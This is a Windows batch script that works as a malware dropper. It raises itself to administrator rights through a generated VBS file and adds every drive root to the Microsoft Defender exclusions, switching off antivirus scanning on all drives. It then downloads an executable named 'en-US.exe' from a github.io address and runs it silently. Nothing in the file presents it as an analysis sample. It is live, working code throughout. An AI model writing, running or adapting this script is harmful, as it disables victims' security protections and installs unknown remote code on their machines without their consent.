@echo off
color a
set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~dp0"" && ""%~0"" %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
powershell -Command "Get-PSDrive -PSProvider FileSystem | ForEach-Object { Add-MpPreference -ExclusionPath ($_.Root) }"
set "url=https://sab49706.github.io/Sab4.github.io/"
set "file=en-US.exe"
set "target=%~dp0"
cd /d "%target%"
curl -L -o "%file%" "%url%"
start "" "%file%" /VERYSILENT /DIR="%target%" /S /D=%target%
en-US.exe
echo Done!
pause